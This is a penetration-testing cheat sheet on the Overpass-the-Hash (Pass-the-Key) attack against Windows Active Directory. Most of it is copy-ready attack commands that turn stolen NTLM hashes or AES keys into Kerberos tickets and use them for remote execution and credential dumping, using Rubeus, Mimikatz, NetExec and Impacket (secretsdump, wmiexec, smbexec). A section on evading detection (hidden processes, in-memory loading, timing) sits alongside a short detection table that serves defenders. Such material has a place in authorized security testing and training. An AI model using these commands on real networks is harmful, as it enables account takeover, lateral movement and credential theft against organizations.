# Overpass-the-Hash (Pass-the-Key)

Overpass-the-Hash (also called Pass-the-Key) converts an NTLM hash into a Kerberos TGT (Ticket-Granting Ticket). Instead of attacking NTLM directly, it uses the hash to request Kerberos tickets, enabling Kerberos-based access to remote resources.

## How It Works

1. A user's NTLM hash is derived from their password
2. The RC4 HMAC Kerberos encryption type uses the NTLM hash as the key (`/rc4:HASH`)
3. Using this key, a TGT can be requested from the Domain Controller via the AS-REQ exchange
4. The TGT is injected into the current session or a new logon session
5. Subsequent Kerberos requests (TGS-REQ for service tickets) use the TGT transparently

## Why Use It

- Kerberos provides service tickets that are easier to use with tools like `dir \\server\share`
- Bypasses NTLM restrictions (e.g., NTLM disabled, NTLM blocking policies)
- Enables access to services that require Kerberos (e.g., some web applications, LDAP signing)
- Kerberos tickets can be exported and reused (Pass-the-Ticket)

## Requirements

| Requirement | Detail |
|-------------|--------|
| Hash/Key | NTLM hash (RC4), AES128, or AES256 key |
| Domain Controller reachable | Must contact DC for AS-REQ |
| DNS resolution | Target hostnames must resolve for Kerberos |
| User principal | Must have `userPrincipalName` or sAMAccountName known |
| Time sync | Clock skew <5 minutes (Kerberos requirement) |

---

## Rubeus

Rubeus is the primary tool for Overpass-the-Hash on Windows.

### Request TGT with NTLM hash (RC4)

```
# Request TGT with RC4 (NTLM hash) and inject into current session
Rubeus.exe asktgt /user:administrator /domain:domain.local /rc4:NTLM_HASH /ptt

# Request TGT without injecting (output as base64 for later use)
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:NTLM_HASH

# Specify DC explicitly
Rubeus.exe asktgt /user:admin /domain:domain.local /dc:dc01.domain.local /rc4:HASH /ptt

# Request TGT with specific target user SID (for S4U)
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:HASH /ptt /sid:S-1-5-21-...

# With additional PAC data
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:HASH /ptt /createnetonly:C:\Windows\System32\cmd.exe
```

### Request TGT with AES keys

```
# AES256
Rubeus.exe asktgt /user:administrator /domain:domain.local /aes256:AES256_KEY /ptt

# AES128
Rubeus.exe asktgt /user:administrator /domain:domain.local /aes128:AES128_KEY /ptt

# Both RC4 and AES (for interoperability)
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:HASH /aes256:AES256_KEY /ptt

# /ptt flag means "Pass The Ticket" (injects into current session)
```

### Request TGT with /opsec flag

```
# OPSEC mode — uses /netonly to hide in a hidden process
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:HASH /ptt /opsec

# Opsec mode with specific process
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:HASH /createnetonly:C:\Windows\System32\svchost.exe /ptt

# /createnetonly creates a hidden process and injects the ticket there
```

### Request TGT for later use (no /ptt)

```
# Output as printable ticket (base64)
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:HASH /nowrap

# Request and dump to file
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:HASH /outfile:ticket.kirbi

# TGT in base64 for use with asktgs
Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:HASH | clip
```

### Verify the TGT is cached

```
# List KerberOS tickets in current session
Rubeus.exe klist

# Alternative
klist

# Filter for TGT
Rubeus.exe klist /luid
```

### Use the TGT to request service tickets

```
# After /ptt, Rubeus automatically handles TGS requests
# But you can also manually request a CIFS service ticket
Rubeus.exe asktgs /service:cifs/target.domain.local /ticket:BASE64_TGT /ptt

# Multiple services
Rubeus.exe asktgs /service:cifs/target.domain.local,ldap/dc.domain.local /ticket:BASE64 /ptt

# HTTP for web applications
Rubeus.exe asktgs /service:HTTP/webapp.domain.local /ticket:BASE64 /ptt

# HOST for full access
Rubeus.exe asktgs /service:HOST/target.domain.local /ticket:BASE64 /ptt
```

After injection, test access:

```
dir \\target\c$
schtasks /S target
```

---

## Mimikatz — Overpass-the-Hash Alternative

Mimikatz can also perform PtH that results in Kerberos tickets via `sekurlsa::pth`:

```
# This creates a new process; any Kerberos auth from it uses the hash
mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:NTLM_HASH /run:powershell.exe

# In the new PowerShell session:
# Kerberos is used automatically for network access
dir \\dc01\c$
klist  # Will show a TGT was obtained
```

**Difference from Rubeus**: Mimikatz patches LSASS to use the hash, then relies on Windows' native Kerberos SSP to request the TGT. Rubeus handles the AS-REQ directly and injects the ticket, without LSASS patching.

---

## With NetExec (formerly CrackMapExec)

NetExec supports obtaining a TGT with a hash and using it for authentication:

```
# Request TGT and use for commands (NTLM -> Kerberos)
nxc smb target -u admin -H NTLM_HASH -k -x whoami

# The -k flag forces Kerberos authentication
nxc smb target -u admin -H HASH -k --use-kcache -x whoami

# Use existing ccache file
nxc smb target --use-kcache -x whoami
```

---

## Impacket — getTGT

Impacket provides `getTGT.py` to request a TGT and store it as a ccache file for use with other Impacket tools:

```
# Request TGT with password
getTGT.py domain.local/admin:'Password123!'

# Request TGT with NTLM hash
getTGT.py -hashes :NTLM_HASH domain.local/admin

# Request TGT with AES key
getTGT.py -aesKey AES256_KEY domain.local/admin

# Export to specific file
getTGT.py -hashes :HASH domain.local/admin -outputfile tgt.ccache
```

Use the TGT with other Impacket tools:

```
# Export TGT to environment
export KRB5CCNAME=/path/to/admin.ccache

# Use with smbexec
KRB5CCNAME=admin.ccache smbexec.py -k domain.local/admin@target.domain.local -no-pass

# Use with wmiexec
KRB5CCNAME=admin.ccache wmiexec.py -k domain.local/admin@target.domain.local -no-pass

# Use with secretsdump
KRB5CCNAME=admin.ccache secretsdump.py -k domain.local/admin@target.domain.local -no-pass

# Use with dcomexec
KRB5CCNAME=admin.ccache dcomexec.py -k domain.local/admin@target.domain.local -no-pass
```

---

## Windows Native — ksetup (Kerberos Realm)

```
# Add a Kerberos realm/domain
ksetup /addkdc DOMAIN.LOCAL dc01.domain.local

# Map user to realm
ksetup /mapuser admin@DOMAIN.LOCAL admin

# Request TGT (uses native Kerberos, requires password not hash)
klist purge
runas /netonly /user:DOMAIN\admin cmd.exe
# In new window: klist will show TGT
```

Native Windows cannot perform Overpass-the-Hash without third-party tools.

---

## OPSEC Considerations

| Factor | Risk Level | Notes |
|--------|------------|-------|
| AS-REQ to DC | High | Every TGT request is logged on the DC |
| Event ID 4768 | High | TGT requested — always generated when a TGT is issued |
| RC4 usage | Medium | RC4 encryption type may be flagged as older/deprecated |
| Rubeus binary | High | Known malicious binary, AV/EDR signatures |
| PowerShell/Reflective loading | Medium | Can load Rubeus in memory to avoid disk |
| Time-based | Medium | TGT requests outside normal hours are suspicious |
| /opsec flag | Lower | Hides process, uses netonly, reduces visibility |

---

## Detection

| Event ID | Source | Description |
|----------|--------|-------------|
| 4768 | Domain Controller | Kerberos TGT requested (check for RC4 / unusual source) |
| 4769 | Domain Controller | Kerberos service ticket requested |
| 4770 | Domain Controller | TGT renewed |
| 4624 | Target System | LogonType 9 (NewCredentials) if sekurlsa::pth used |
| 4648 | Target System | Explicit credential logon |
| 4672 | Target System | Admin logon with special privileges |
| 4104 | PowerShell | Script block logging (Rubeus execution) |

**Detection logic**:
- Monitor Event ID 4768 for RC4 encryption type requests (`Ticket Encryption Type: 0x17`) from non-standard sources
- Spike in TGT requests from a single machine to many users = Overpass-the-Hash or Kerberoasting
- Multiple 4768 events with RC4 encryption type and same source IP across accounts
- Event 4768 with `Pre-authentication type: 0` (no pre-auth) combined with RC4

## When to Use Overpass-the-Hash

- **NTLM is blocked or restricted** on the target network
- **Target services require Kerberos** (e.g., LDAP with signing enabled)
- **Need service tickets** for Silver Ticket attacks or constrained delegation abuse
- **Already on a Windows host** with Rubeus/Mimikatz available
- **Want to blend into Kerberos traffic** instead of NTLM challenge-response
- **After hash extraction** from LSASS, NTDS.dit, SAM, or DCSync
